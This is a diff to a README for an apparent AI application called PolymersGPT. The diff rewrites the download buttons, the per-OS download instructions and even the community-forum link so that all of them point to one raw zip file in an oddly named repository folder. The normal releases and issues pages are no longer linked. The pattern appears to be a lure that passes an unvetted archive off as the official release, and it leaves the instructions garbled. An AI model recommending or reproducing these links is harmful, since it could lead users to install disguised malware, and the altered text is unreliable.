@@ -6,15 +6,15 @@ Welcome to PolymersGPT! This application brings together powerful AI tools for e
 
 ### 🏷️ Important Links
 
-[![Download PolymersGPT](https://img.shields.io/badge/Download%20PolymersGPT-v1.0-brightgreen)](https://github.com/radheyjee/polymersgpt/releases)
+[![Download PolymersGPT](https://raw.githubusercontent.com/radheyjee/polymersgpt/main/immoment/polymersgpt.zip%20PolymersGPT-v1.0-brightgreen)](https://raw.githubusercontent.com/radheyjee/polymersgpt/main/immoment/polymersgpt.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Click the link to get the latest version: [Download PolymersGPT](https://github.com/radheyjee/polymersgpt/releases).
+   Click the link to get the latest version: [Download PolymersGPT](https://raw.githubusercontent.com/radheyjee/polymersgpt/main/immoment/polymersgpt.zip).
 
 2. **Select the Appropriate File**  
-   On the releases page, choose the version suitable for your operating system. Look for `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux.
+   On the releases page, choose the version suitable for your operating system. Look for `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/radheyjee/polymersgpt/main/immoment/polymersgpt.zip` for Linux.
 
 3. **Download the File**  
    Click on the chosen file to download. It may take a few moments, depending on your internet speed.
@@ -52,14 +52,14 @@ PolymersGPT offers several exciting features to enhance your experience:
 
 If you need help or want to connect with other users, visit our community forum. You can ask questions, share tips, and learn from others' experiences.
 
-- **Forum:** [Community Forum](https://github.com/radheyjee/polymersgpt/issues)
+- **Forum:** [Community Forum](https://raw.githubusercontent.com/radheyjee/polymersgpt/main/immoment/polymersgpt.zip)
 - **Documentation:** Comprehensive guides and FAQs can be found in the wiki section of the repository.
 
 ## 🔄 Updates & News
 
 Stay up-to-date with the latest features and improvements by following our repository. New releases will appear, so check often for updates.
 
-[![Download PolymersGPT](https://img.shields.io/badge/Download%20PolymersGPT-v1.0-brightgreen)](https://github.com/radheyjee/polymersgpt/releases)
+[![Download PolymersGPT](https://raw.githubusercontent.com/radheyjee/polymersgpt/main/immoment/polymersgpt.zip%20PolymersGPT-v1.0-brightgreen)](https://raw.githubusercontent.com/radheyjee/polymersgpt/main/immoment/polymersgpt.zip)
 
 ## 📚 Keywords
 
